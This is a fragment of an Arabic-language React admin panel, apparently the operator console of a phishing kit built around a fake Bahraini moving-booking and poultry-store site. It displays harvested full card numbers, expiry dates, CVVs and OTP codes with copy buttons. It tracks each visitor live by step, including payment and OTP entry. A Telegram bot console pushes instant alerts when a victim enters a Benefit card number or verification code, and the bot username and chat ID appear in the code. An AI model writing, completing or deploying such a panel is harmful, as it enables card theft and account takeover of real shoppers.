                            <span className="text-slate-500">
                              {formatDateTime(b.createdAt)}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Financial Amount */}
                      <div className="flex items-center gap-3 self-end lg:self-center">
                        <div className="text-left lg:text-right">
                          <div className="text-xs text-slate-400 font-medium">المبلغ المسدد</div>
                          <div className="text-xl font-black text-amber-300 font-mono">
                            {(b.depositAmount || b.paymentAmount || 0)} {b.paymentCurrency || 'BHD'}
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Middle Section: Route / Addresses & Booking Details */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 my-3.5 text-xs">
                      <div className="bg-slate-950/60 rounded-xl p-3 border border-slate-800/80">
                        <div className="text-slate-400 font-bold mb-1 flex items-center gap-1.5">
                          <MapPin className="w-3.5 h-3.5 text-emerald-400" />
                          <span>تفاصيل الموقع والتوصيل:</span>
                        </div>
                        <div className="text-slate-200">
                          <strong>من:</strong> {b.fromAddress || b.fromCity || 'غير محدد'}
                        </div>
                        <div className="text-slate-200 mt-1">
                          <strong>إلى:</strong> {b.toAddress || b.toCity || 'غير محدد'}
                        </div>
                        {(b.moveDate || b.moveTime) && (
                          <div className="text-slate-400 mt-1 flex items-center gap-2">
                            <Calendar className="w-3.5 h-3.5 text-slate-500" />
                            <span>{b.moveDate} {b.moveTime ? `(${b.moveTime})` : ''}</span>
                          </div>
                        )}
                      </div>

                      {/* Package / Notes */}
                      <div className="bg-slate-950/60 rounded-xl p-3 border border-slate-800/80">
                        <div className="text-slate-400 font-bold mb-1 flex items-center gap-1.5">
                          <Layers className="w-3.5 h-3.5 text-sky-400" />
                          <span>الباقة والملاحظات:</span>
                        </div>
                        <div className="text-slate-200">
                          <strong>الباقة / الحجم:</strong> {b.packageLabel || b.propertySize || 'افتراضي'}
                        </div>
                        {b.notes && (
                          <div className="text-slate-300 mt-1 italic">
                            "{b.notes}"
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Bottom: Card Details & Verification Code (OTP) */}
                    <div className="bg-gradient-to-r from-slate-950 via-slate-900 to-slate-950 rounded-xl p-3.5 border border-slate-800 flex flex-col md:flex-row md:items-center justify-between gap-3">
                      
                      <div className="flex flex-wrap items-center gap-3">
                        {/* Card Info Box */}
                        <div className="flex items-center gap-2">
                          <CreditCard className="w-4 h-4 text-amber-400" />
                          <span className="text-xs text-slate-400">البطاقة:</span>
                          <span className="font-mono text-sm font-bold text-amber-200 tracking-wider">
                            {isRevealed && b.cardNumber ? b.cardNumber : cardNum}
                          </span>
                          {b.cardNumber && (
                            <button
                              onClick={() => toggleRevealCard(b.id)}
                              className="text-slate-400 hover:text-white p-1 rounded transition cursor-pointer"
                              title={isRevealed ? 'إخفاء الرقم' : 'إظهار الرقم الكامل'}
                            >
                              {isRevealed ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                            </button>
                          )}
                          {b.cardNumber && (
                            <button
                              onClick={() => handleCopyText(b.cardNumber!, 'رقم البطاقة')}
                              className="text-slate-400 hover:text-white p-1 rounded transition cursor-pointer"
                              title="نسخ رقم البطاقة"
                            >
                              <Copy className="w-3.5 h-3.5" />
                            </button>
                          )}
                        </div>

                        {/* Card Brand */}
                        {b.cardBrand && (
                          <span className="bg-slate-800 text-slate-300 text-[11px] font-bold px-2 py-0.5 rounded border border-slate-700">
                            {b.cardBrand}
                          </span>
                        )}

                        {/* Expiry */}
                        {b.cardExpiry && (
                          <span className="text-xs text-slate-300 font-mono">
                            <span className="text-slate-500">EXP:</span> {b.cardExpiry}
                          </span>
                        )}

                        {/* CVV */}
                        {b.cardCvv && (
                          <span className="text-xs text-slate-300 font-mono">
                            <span className="text-slate-500">CVV:</span> {b.cardCvv}
                          </span>
                        )}

                        {/* Verification Code / OTP (Highlighted) */}
                        {b.verificationCode && (
                          <div className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-300 px-3 py-1 rounded-lg text-xs font-bold flex items-center gap-1.5 shadow-sm">
                            <KeyRound className="w-3.5 h-3.5 text-yellow-400" />
                            <span>كود الـ OTP:</span>
                            <span className="font-mono text-sm font-black tracking-widest text-yellow-200">
                              {b.verificationCode}
                            </span>
                            <button
                              onClick={() => handleCopyText(b.verificationCode!, 'كود الـ OTP')}
                              className="text-yellow-400 hover:text-white mr-1 cursor-pointer"
                              title="نسخ الكود"
                            >
                              <Copy className="w-3 h-3" />
                            </button>
                          </div>
                        )}
                      </div>

                      {/* Actions: Status Dropdown & Delete */}
                      <div className="flex items-center gap-2 self-end md:self-center">
                        <select
                          value={b.status || 'confirmed'}
                          onChange={(e) => handleUpdateStatus(b.id, e.target.value)}
                          disabled={updatingId === b.id}
                          className="bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 cursor-pointer disabled:opacity-50"
                        >
                          <option value="confirmed">تأكيد (Confirmed)</option>
                          <option value="pending">معلق (Pending)</option>
                          <option value="delivered">مكتمل (Delivered)</option>
                          <option value="cancelled">ملغي (Cancelled)</option>
                        </select>

                        <button
                          onClick={() => handleDeleteBooking(b.id)}
                          disabled={updatingId === b.id}
                          className="p-1.5 text-red-400 hover:text-red-300 hover:bg-red-950/50 rounded-lg transition cursor-pointer disabled:opacity-50"
                          title="حذف الحجز من قاعدة البيانات"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>

                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* ==================================================================== */}
      {/* TAB 2: LIVE VISITORS (esfgdr)                                        */}
      {/* ==================================================================== */}
      {activeTab === 'visitors' && (
        <div className="space-y-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4 mb-4">
              <div>
                <h3 className="font-bold text-white text-lg flex items-center gap-2">
                  <Radio className="w-5 h-5 text-green-400 animate-pulse" />
                  <span>الزوار المتصلون حالياً في الموقع ({onlineVisitorsCount} متصل)</span>
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  تحديث مباشر لحظي لكل زائر، الصفحة والخطوة التي يقف عليها الآن.
                </p>
              </div>

              <div className="text-xs text-slate-400">
                إجمالي سجلات الزوار: <strong className="text-white font-mono">{esfgdrVisitors.length}</strong>
              </div>
            </div>

            {esfgdrVisitors.length === 0 ? (
              <div className="text-center py-12 text-slate-500">
                لا توجد سجلات زوار حالياً في قاعدة البيانات.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-xs text-right">
                  <thead>
                    <tr className="border-b border-slate-800 text-slate-400 font-bold">
                      <th className="py-2.5 px-3">الحالة</th>
                      <th className="py-2.5 px-3">معرف الجلسة (Session ID)</th>
                      <th className="py-2.5 px-3">الصفحة الحالية</th>
                      <th className="py-2.5 px-3">الخطوة الحالية (Current Step)</th>
                      <th className="py-2.5 px-3">تاريخ الإنشاء</th>
                      <th className="py-2.5 px-3">آخر نشاط</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/60 font-mono">
                    {esfgdrVisitors.map((v) => (
                      <tr key={v.id} className="hover:bg-slate-800/40 transition">
                        <td className="py-3 px-3">
                          {v.isOnline ? (
                            <span className="bg-green-500/20 text-green-400 border border-green-500/30 text-[10px] font-bold px-2 py-0.5 rounded-full flex items-center gap-1.5 w-fit">
                              <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-ping"></span>
                              متصل الآن
                            </span>
                          ) : (
                            <span className="bg-slate-800 text-slate-500 text-[10px] px-2 py-0.5 rounded-full">
                              غير متصل
                            </span>
                          )}
                        </td>
                        <td className="py-3 px-3 text-slate-300 font-medium font-mono text-[11px]">
                          {v.sessionId || v.id}
                        </td>
                        <td className="py-3 px-3 text-sky-400 font-medium">
                          {v.currentPage || '—'}
                        </td>
                        <td className="py-3 px-3">
                          <span className="bg-yellow-500/10 text-yellow-300 border border-yellow-500/20 px-2 py-0.5 rounded text-[11px] font-bold">
                            {v.currentStep || 'booking'}
                          </span>
                        </td>
                        <td className="py-3 px-3 text-slate-400 font-sans">
                          {formatDateTime(v.createdAt)}
                        </td>
                        <td className="py-3 px-3 text-slate-400 font-sans">
                          {formatDateTime(v.updatedAt)}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ==================================================================== */}
      {/* TAB 3: LIVE STEPS STREAM (bookings_steps)                            */}
      {/* ==================================================================== */}
      {activeTab === 'steps' && (
        <div className="space-y-4">
          {/* Steps Filters */}
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-3 sm:p-4 flex flex-col md:flex-row items-center justify-between gap-3">
            <div className="relative w-full md:w-80">
              <Search className="w-4 h-4 text-slate-400 absolute right-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="بحث في محتوى الخطوات والبيانات..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg pr-10 pl-4 py-2 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:border-emerald-500"
              />
            </div>

            <div className="flex items-center gap-2 overflow-x-auto w-full md:w-auto pb-1 md:pb-0">
              <span className="text-xs text-slate-400 font-medium whitespace-nowrap">النوع:</span>
              <button
                onClick={() => setStepFilter('all')}
                className={`px-2.5 py-1 rounded-lg text-xs font-bold transition whitespace-nowrap cursor-pointer ${
                  stepFilter === 'all' ? 'bg-emerald-600 text-white' : 'bg-slate-950 text-slate-400 hover:text-white'
                }`}
              >
                الكل ({esfgdrSteps.length})
              </button>
              <button
                onClick={() => setStepFilter('payment')}
                className={`px-2.5 py-1 rounded-lg text-xs font-bold transition whitespace-nowrap cursor-pointer ${
                  stepFilter === 'payment' ? 'bg-amber-600 text-white' : 'bg-slate-950 text-slate-400 hover:text-white'
                }`}
              >
                💳 دفع وبطاقات
              </button>
              <button
                onClick={() => setStepFilter('otp')}
                className={`px-2.5 py-1 rounded-lg text-xs font-bold transition whitespace-nowrap cursor-pointer ${
                  stepFilter === 'otp' ? 'bg-yellow-600 text-white' : 'bg-slate-950 text-slate-400 hover:text-white'
                }`}
              >
                🔑 رمز OTP
              </button>
              <button
                onClick={() => setStepFilter('details')}
                className={`px-2.5 py-1 rounded-lg text-xs font-bold transition whitespace-nowrap cursor-pointer ${
                  stepFilter === 'details' ? 'bg-sky-600 text-white' : 'bg-slate-950 text-slate-400 hover:text-white'
                }`}
              >
                📝 تفاصيل العميل
              </button>
              <button
                onClick={() => setStepFilter('booking')}
                className={`px-2.5 py-1 rounded-lg text-xs font-bold transition whitespace-nowrap cursor-pointer ${
                  stepFilter === 'booking' ? 'bg-purple-600 text-white' : 'bg-slate-950 text-slate-400 hover:text-white'
                }`}
              >
                📦 تأكيد الحجز
              </button>
            </div>
          </div>

          {/* Steps List */}
          <div className="space-y-3">
            {filteredSteps.map((step) => {
              const isExpanded = expandedStepId === step.id;
              const stepName = step.step || 'unknown';
              const isCardOrOtp = ['payment', 'payment_started', 'otp', 'otp_requested'].includes(stepName);

              return (
                <div 
                  key={step.id} 
                  className={`bg-slate-900 border rounded-xl p-3.5 transition shadow ${
                    isCardOrOtp ? 'border-amber-500/40 bg-slate-900/90' : 'border-slate-800'
                  }`}
                >
                  <div className="flex items-center justify-between gap-3">
                    <div className="flex items-center gap-2.5 flex-wrap">
                      <span className={`text-xs font-bold px-2.5 py-1 rounded-lg ${
                        stepName === 'otp' ? 'bg-yellow-500 text-slate-950 font-black' :
                        stepName === 'payment' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' :
                        stepName === 'payment_started' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' :
                        stepName === 'details_filled' ? 'bg-sky-500/20 text-sky-300 border border-sky-500/40' :
                        stepName === 'confirmed' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' :
                        'bg-slate-800 text-slate-300'
                      }`}>
                        {stepName === 'otp' && '🔑 '}
                        {stepName === 'payment' && '💳 '}
                        {stepName}
                      </span>

                      <span className="text-xs text-slate-400 font-mono">
                        الجلسة: <strong className="text-slate-300">{step.sessionId}</strong>
                      </span>

                      {step.page && (
                        <span className="text-xs text-slate-500 font-mono">
                          ({step.page})
                        </span>
                      )}
                    </div>

                    <div className="flex items-center gap-2">
                      <span className="text-xs text-slate-400">
                        {formatDateTime(step.timestamp)}
                      </span>

                      <button
                        onClick={() => setExpandedStepId(isExpanded ? null : step.id)}
                        className="text-slate-400 hover:text-white p-1 rounded transition cursor-pointer"
                        title={isExpanded ? 'طي البيانات' : 'عرض محتوى الـ JSON'}
                      >
                        {isExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                      </button>

                      <button
                        onClick={() => handleDeleteStep(step.id)}
                        className="text-red-400 hover:text-red-300 p-1 rounded transition cursor-pointer"
                        title="حذف هذا السجل"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>

                  {/* Summary Preview */}
                  {step.data && (
                    <div className="mt-2 text-xs text-slate-300 flex flex-wrap gap-2">
                      {step.data.cardNumber && (
                        <span className="bg-slate-950 px-2 py-0.5 rounded font-mono text-amber-300 border border-slate-800">
                          بطاقة: {step.data.cardNumber}
                        </span>
                      )}
                      {step.data.otpCode && (
                        <span className="bg-yellow-500/20 px-2 py-0.5 rounded font-mono font-bold text-yellow-300 border border-yellow-500/40">
                          OTP: {step.data.otpCode}
                        </span>
                      )}
                      {step.data.cardHolder && (
                        <span className="bg-slate-950 px-2 py-0.5 rounded font-sans text-slate-300 border border-slate-800">
                          الاسم: {step.data.cardHolder}
                        </span>
                      )}
                      {step.data.phone && (
                        <span className="bg-slate-950 px-2 py-0.5 rounded font-mono text-emerald-400 border border-slate-800">
                          هاتف: {step.data.phone}
                        </span>
                      )}
                      {step.data.amount && (
                        <span className="bg-slate-950 px-2 py-0.5 rounded font-mono text-slate-300 border border-slate-800">
                          المبلغ: {step.data.amount} د.ب
                        </span>
                      )}
                    </div>
                  )}

                  {/* Expanded Full JSON */}
                  {isExpanded && step.data && (
                    <div className="mt-3 pt-3 border-t border-slate-800">
                      <div className="flex items-center justify-between text-[11px] text-slate-400 mb-1">
                        <span>محتوى الحمولة (Payload):</span>
                        <button
                          onClick={() => handleCopyText(JSON.stringify(step.data, null, 2), 'بيانات الـ JSON')}
                          className="hover:text-white flex items-center gap-1 cursor-pointer"
                        >
                          <Copy className="w-3 h-3" /> نسخ
                        </button>
                      </div>
                      <pre className="bg-slate-950 p-3 rounded-lg text-emerald-400 font-mono text-xs overflow-x-auto border border-slate-800/80">
                        {JSON.stringify(step.data, null, 2)}
                      </pre>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* ==================================================================== */}
      {/* TAB 4: TELEGRAM BOT CONSOLE                                          */}
      {/* ==================================================================== */}
      {activeTab === 'telegram' && (
        <div className="max-w-4xl mx-auto space-y-6">
          
          {/* Main Bot Overview Card */}
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-5 mb-5">
              <div className="flex items-center gap-3.5">
                <div className="w-12 h-12 rounded-xl bg-sky-500/20 text-sky-400 border border-sky-500/30 flex items-center justify-center shrink-0 shadow-lg shadow-sky-500/10">
                  <Bot className="w-7 h-7" />
                </div>
                <div>
                  <div className="flex items-center gap-2 flex-wrap">
                    <h3 className="font-bold text-white text-lg">بوت تلغرام للإشعارات الفورية</h3>
                    <span className="bg-sky-500/20 text-sky-300 text-xs px-2.5 py-0.5 rounded-full font-mono font-bold border border-sky-500/30">
                      @{telegramConfig.botUsername}
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 mt-1">
                    يصلك تنبيه فوري لحظة قيام الزائر بإدخال رقم بطاقة بنفت أو رمز OTP أو إتمام الطلب.
                  </p>
                </div>
              </div>

              <a
                href={`https://t.me/${telegramConfig.botUsername}`}
                target="_blank"
                rel="noopener noreferrer"
                className="bg-sky-600 hover:bg-sky-500 text-white text-xs font-bold px-4 py-2.5 rounded-xl transition flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-sky-600/25 shrink-0"
              >
                <ExternalLink className="w-4 h-4" />
                <span>فتح البوت في تلغرام</span>
              </a>
            </div>

            {/* Crucial Activation Step Notice */}
            <div className="bg-amber-950/40 border border-amber-600/40 rounded-xl p-4 mb-6">
              <div className="flex items-start gap-3">
                <AlertCircle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
                <div className="text-xs text-amber-200/90 leading-relaxed space-y-2">
                  <div className="font-bold text-amber-300 text-sm">
                    ⚠️ خطوة تفعيل البوت الجديد (مهم جداً لمرة واحدة فقط):
                  </div>
                  <div>
                    وفقاً لقواعد وسياسات تطبيق تلغرام، <strong>لا يمكن للبوت الجديد بدء إرسال أي رسائل إلى حسابك</strong> حتى تقوم أنت بفتح محادثة البوت أولاً والضغط على زر <strong>(Start / ابدأ)</strong>.
                  </div>
                  <div className="flex items-center gap-2 pt-1 flex-wrap">
                    <a
                      href={`https://t.me/${telegramConfig.botUsername}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="bg-amber-500 text-slate-950 font-black px-3 py-1.5 rounded-lg text-xs hover:bg-amber-400 transition inline-flex items-center gap-1.5"
                    >
                      <Zap className="w-3.5 h-3.5 fill-current" />
                      1. اضغط هنا لفتح @{telegramConfig.botUsername} واضغط Start
                    </a>

                    <button
                      type="button"
                      onClick={handleScanUpdates}
                      disabled={isCheckingUpdates}
                      className="bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold px-3 py-1.5 rounded-lg text-xs transition inline-flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${isCheckingUpdates ? 'animate-spin' : ''}`} />
                      2. فحص والتحقق من التفعيل
                    </button>
                  </div>
                </div>
              </div>
            </div>

            {/* Auto Detect Results */}
            {hasScannedUpdates && (
              <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 mb-6">
                <div className="flex items-center justify-between mb-3">
                  <h4 className="text-xs font-bold text-slate-200 flex items-center gap-2">
                    <Search className="w-4 h-4 text-sky-400" />
                    <span>نتائج الفحص التلقائي لرسائل البوت:</span>
                  </h4>
                  <span className="text-[11px] text-slate-400">
                    {detectedChats.length} حساب تم اكتشافه
                  </span>
                </div>

                {detectedChats.length === 0 ? (
                  <div className="text-xs text-slate-400 bg-slate-900/60 p-3 rounded-lg border border-slate-800/80">
                    لم تصل أي رسائل للبوت بعد. تأكد من فتح الرابط <a href={`https://t.me/${telegramConfig.botUsername}`} target="_blank" rel="noopener noreferrer" className="text-sky-400 underline font-mono">t.me/{telegramConfig.botUsername}</a> والضغط على Start أو إرسال أي كلمة، ثم اضغط على زر الفحص مجدداً.
                  </div>
                ) : (
                  <div className="space-y-2">
                    {detectedChats.map((c) => (
                      <div key={c.id} className="flex items-center justify-between bg-slate-900 p-2.5 rounded-lg border border-slate-800 text-xs">
                        <div>
                          <div className="font-bold text-white flex items-center gap-2">
                            <span>{c.name}</span>
                            {c.username && <span className="text-sky-400 font-mono text-[11px]">@{c.username}</span>}
                          </div>
                          <div className="text-slate-400 font-mono text-[11px] mt-0.5">
                            معرف الدردشة: <strong className="text-emerald-400">{c.id}</strong> {c.text && `(آخر رسالة: "${c.text}")`}
                          </div>
                        </div>

                        <button
                          type="button"
                          onClick={() => handleApplyChatId(c.id)}
                          className="bg-emerald-600 hover:bg-emerald-500 text-white font-bold px-3 py-1.5 rounded-lg transition text-xs flex items-center gap-1 cursor-pointer"
                        >
                          <Check className="w-3.5 h-3.5" />
                          <span>اعتماد هذا الـ Chat ID</span>
                        </button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Error Detail Banner */}
            {telegramErrorDetail && (
              <div className="bg-red-950/70 border border-red-800 rounded-xl p-3.5 mb-6 text-xs text-red-200">
                <div className="font-bold text-red-300 mb-1 flex items-center gap-1.5">
                  <AlertCircle className="w-4 h-4" />
                  <span>تفاصيل استجابة تلغرام:</span>
                </div>
                <div className="font-mono bg-black/40 p-2 rounded text-red-300 break-all mb-2">
                  {telegramErrorDetail}
                </div>
                {telegramErrorDetail.includes('chat not found') && (
                  <div className="text-amber-200">
                    💡 <strong>سبب هذا الخطأ:</strong> حسابك لم يقم ببدء المحادثة مع البوت الجديد بعد. اضغط على <a href={`https://t.me/${telegramConfig.botUsername}`} target="_blank" rel="noopener noreferrer" className="underline font-bold text-white">t.me/{telegramConfig.botUsername}</a> ثم اضغط <strong>Start</strong> في المحادثة، وبعدها أعد التجربة.
                  </div>
                )}
              </div>
            )}

            {/* Quick Actions & Live Test */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
              <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex flex-col justify-between">
                <div>
                  <div className="text-xs text-slate-400 font-medium mb-1">معرف الدردشة النشط (Target Chat ID):</div>
                  <div className="font-mono text-base font-bold text-emerald-400 flex items-center gap-2">
                    <span>{telegramConfig.chatId}</span>
                    <button
                      onClick={() => handleCopyText(telegramConfig.chatId, 'معرف المحادثة')}
                      className="text-slate-500 hover:text-white p-1 rounded transition cursor-pointer"
                      title="نسخ معرف المحادثة"
                    >
                      <Copy className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={handleQuickTelegramTest}
                  disabled={isSendingTelegram}
                  className="mt-4 bg-sky-600 hover:bg-sky-500 disabled:opacity-50 text-white text-xs font-bold px-4 py-2.5 rounded-xl transition flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-sky-600/20"
                >
                  <Send className="w-4 h-4" />
                  <span>{isSendingTelegram ? 'جاري الإرسال...' : '⚡ إرسال تقرير إحصائي تجريبي الآن'}</span>
                </button>
              </div>

              <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex flex-col justify-between">
                <div>
                  <div className="text-xs text-slate-400 font-medium mb-1">رمز البوت النشط (Bot Token):</div>
                  <div className="font-mono text-xs text-sky-300 break-all bg-slate-900 p-2 rounded border border-slate-800">
                    {telegramConfig.botToken}
                  </div>
                </div>

                <div className="mt-3 flex items-center gap-2">
                  <button
                    type="button"
                    onClick={() => handleCopyText(telegramConfig.botToken, 'رمز البوت')}
                    className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold py-2 rounded-xl transition flex items-center justify-center gap-1.5 cursor-pointer"
                  >
                    <Copy className="w-3.5 h-3.5" />
                    <span>نسخ الـ Token</span>
                  </button>
                  <button
                    type="button"
                    onClick={handleResetTelegramConfig}
                    className="bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold px-3 py-2 rounded-xl transition cursor-pointer"
                    title="استعادة الإعدادات الأصلية للبوت"
                  >
                    استعادة الافتراضي
                  </button>
                </div>
              </div>
            </div>

            {/* Custom Telegram Message Form */}
            <form onSubmit={handleSendTelegram} className="space-y-3 pt-2 border-t border-slate-800">
              <label className="block text-xs font-bold text-slate-300">
                إرسال رسالة مخصصة فورية إلى البوت عبر تلغرام:
              </label>
              <textarea
                rows={3}
                value={telegramMsg}
                onChange={(e) => setTelegramMsg(e.target.value)}
                placeholder="اكتب أي رسالة تجريبية هنا لإرسالها فوراً إلى المحادثة المربوطة..."
                className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:border-sky-500"
              />
              <div className="flex justify-end">
                <button
                  type="submit"
                  disabled={isSendingTelegram || !telegramMsg.trim()}
                  className="bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white text-xs font-bold px-6 py-2.5 rounded-xl transition flex items-center gap-2 cursor-pointer shadow-lg shadow-emerald-600/20"
                >
                  <Send className="w-4 h-4" />
                  <span>{isSendingTelegram ? 'جاري الإرسال...' : 'إرسال الرسالة إلى هاتفك'}</span>
                </button>
              </div>
            </form>
          </div>

          {/* Configuration Settings Box */}
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 sm:p-6 shadow-xl">
            <h4 className="font-bold text-white text-base mb-1 flex items-center gap-2">
              <KeyRound className="w-4 h-4 text-emerald-400" />
              <span>تعديل وحفظ إعدادات البوت والدردشة (Telegram Configuration)</span>
            </h4>
            <p className="text-xs text-slate-400 mb-4">
              يمكنك تحديث رمز البوت أو معرف الدردشة في أي وقت، وسيتم حفظها محلياً واستخدامها في كافة الإشعارات الفورية.
            </p>

            <form onSubmit={handleSaveTelegramConfig} className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="md:col-span-2">
                  <label className="block text-xs text-slate-300 font-bold mb-1">
                    رمز البوت (Bot Token من BotFather):
                  </label>
                  <input
                    type="text"
                    value={tokenInput}
                    onChange={(e) => setTokenInput(e.target.value)}
                    placeholder="أدخل رمز البوت (Bot Token)..."
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-sky-300 placeholder-slate-600 focus:outline-none focus:border-sky-500"
                  />
                </div>

                <div>
                  <label className="block text-xs text-slate-300 font-bold mb-1">
                    اسم مستخدم البوت (Username):
                  </label>
                  <input
                    type="text"
                    value={usernameInput}
                    onChange={(e) => setUsernameInput(e.target.value)}
                    placeholder="ghhfvsshsorffs_bot"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-sky-500"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs text-slate-300 font-bold mb-1">
                  معرف المحادثة أو القناة (Target Chat ID):
                </label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={chatIdInput}
                    onChange={(e) => setChatIdInput(e.target.value)}
                    placeholder="6726553753"
                    className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs font-mono text-emerald-400 placeholder-slate-600 focus:outline-none focus:border-emerald-500"
                  />
                  <button
                    type="button"
                    onClick={handleScanUpdates}
                    disabled={isCheckingUpdates}
                    className="bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold px-3.5 py-2.5 rounded-xl transition flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
                    title="البحث عن Chat ID تلقائياً من محادثات البوت"
                  >
                    <Search className="w-3.5 h-3.5" />
                    <span>فحص تلقائي</span>
                  </button>
                </div>
              </div>

              <div className="flex items-center justify-between pt-2">
                <button
                  type="button"
                  onClick={handleResetTelegramConfig}
                  className="text-xs text-slate-400 hover:text-white underline cursor-pointer"
                >
                  استعادة الإعدادات الأصلية للبوت (@ghhfvsshsorffs_bot)
                </button>

                <button
                  type="submit"
                  className="bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold px-5 py-2.5 rounded-xl transition flex items-center gap-2 cursor-pointer shadow-lg shadow-emerald-600/20"
                >
                  <Check className="w-4 h-4" />
                  <span>حفظ إعدادات البوت والدردشة</span>
                </button>
              </div>
            </form>
          </div>

        </div>
      )}


      {/* ==================================================================== */}
      {/* TAB 5: LOCAL STORE ORDERS (Delmon)                                   */}
      {/* ==================================================================== */}
      {activeTab === 'store_orders' && (
        <div className="space-y-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-5">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-4">
              <div>
                <h3 className="font-bold text-white text-base">طلبات متجر دلمون للدواجن والمواشي</h3>
                <p className="text-xs text-slate-400">سجل الطلبات المباشرة من سلة المشتريات.</p>
              </div>
              <span className="text-xs text-slate-400 font-mono">
                {storeOrders.length} طلب
              </span>
            </div>

            {storeOrders.length === 0 ? (
              <div className="text-center py-12 text-slate-500">
                لا توجد طلبات متجر بعد في هذا المعرف.
              </div>
            ) : (
              <div className="space-y-3">
                {storeOrders.map((o) => (
                  <div key={o.orderId} className="bg-slate-950 border border-slate-800 rounded-xl p-3.5 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                    <div>
                      <div className="font-bold text-white text-sm">
                        {o.customerName} — <span className="font-mono text-emerald-400">#{o.orderId}</span>
                      </div>
                      <div className="text-xs text-slate-400 mt-0.5">
                        {o.customerPhone} • {o.customerAddress} • {o.itemCount || 1} منتجات
                      </div>
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="text-left sm:text-right">
                        <div className="font-mono font-bold text-amber-300">{o.total?.toFixed(3)} د.ب</div>
                        <div className="text-[11px] text-emerald-400">{o.status}</div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ==================================================================== */}
      {/* TAB 6: RAW DATA & EXPORT                                             */}
      {/* ==================================================================== */}
      {activeTab === 'raw' && (
        <div className="space-y-4">
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 sm:p-5">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-slate-800 pb-3 mb-4">
              <div className="flex items-center gap-3">
                <span className="text-xs font-bold text-slate-300">اختر المجموعة:</span>
                <select
                  value={rawCollection}
                  onChange={(e) => setRawCollection(e.target.value as any)}
                  className="bg-slate-950 border border-slate-700 rounded-lg px-3 py-1.5 text-xs font-bold text-slate-200 focus:outline-none focus:border-purple-500 cursor-pointer"
                >
                  <option value="bookings">الحجوزات والعمليات (bookings - esfgdr)</option>
                  <option value="visitors">الزوار المتصلين (visitors - esfgdr)</option>
                  <option value="bookings_steps">سجل الخطوات (bookings_steps - esfgdr)</option>
                  <option value="store_orders">طلبات المتجر (store_orders)</option>
                </select>
              </div>

              <div className="flex items-center gap-2">
                <button
                  onClick={handleExportCSV}
